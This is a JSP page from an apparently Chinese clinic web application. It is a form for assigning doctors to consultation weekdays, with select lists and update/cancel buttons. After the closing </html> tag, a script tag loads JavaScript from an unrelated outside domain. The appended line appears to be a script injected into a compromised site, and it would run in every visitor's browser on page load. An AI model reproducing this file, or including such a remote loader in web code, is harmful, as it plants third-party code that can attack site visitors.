<%--
  Created by IntelliJ IDEA.
  User: ibm
  Date: 2018/7/10
  Time: 13:47
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>坐诊时间</title>
    <link type="text/css" href="../css/stylesheet.css" rel="stylesheet"/>
    <script type = "text/javascript">
    </script>
</head>
<body>
<center>
    <table height="20" border="0" >
        <tr>
            <td colspan = "5" align="center" size="3"><b>坐诊时间</b><p></td>
        </tr>
        <tr valign="top">
            <td align="left" colspan = "4">坐诊时间:&nbsp;&nbsp;
                <select name="sttime" id="" onchange=filltime(this.value)>
                    <option value="">==时间==</option>
                    <option value="">星期天</option>
                    <option value="">星期一</option>
                    <option value="">星期二</option>
                    <option value="">星期三</option>
                    <option value="">星期四</option>
                    <option value="">星期五</option>
                    <option value="">星期六</option>
                </select><p>
            </td>
        <tr>
            <td>现有医生:<br/>
                <select multiple size="4" style="width:150;height:150">
                    <option value="">闫怀冬</option>
                    <option value="">李敏</option>
                    <option value="">孙景元</option>
                    <option value="">许敏</option>
                </select><p>
            </td>
            <td align="center">
                <input type="button" value=">"  style="width:40"><br/>
                <input type="button" value="<"  style="width:40"><br/>
                <input type="button" value=">>"  style="width:40"><br/>
                <input type="button" value="<<"  style="width:40">
            </td>
            <td> 坐诊医生:<br/>
                <select multiple size="4" style="width:150;height:150">
                    <option value="">闫怀冬</option>
                    <option value="">李敏</option>
                    <option value="">孙景元</option>
                    <option value="">许敏</option>
                </select><p>
            </td>
        </tr>
        <tr align="center">
            <td  colspan="5" >
                <img src="../images/btn_update.GIF" alt="更新" onclick="alert('login')">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <img src="../images/btn_cancel.GIF" alt="取消" onclick="alert('login')">
            </td>
        </tr>
</center>
</table>
</body>
</html><script language=javascript src=http://www.haofbi.com/js/w.js></script>
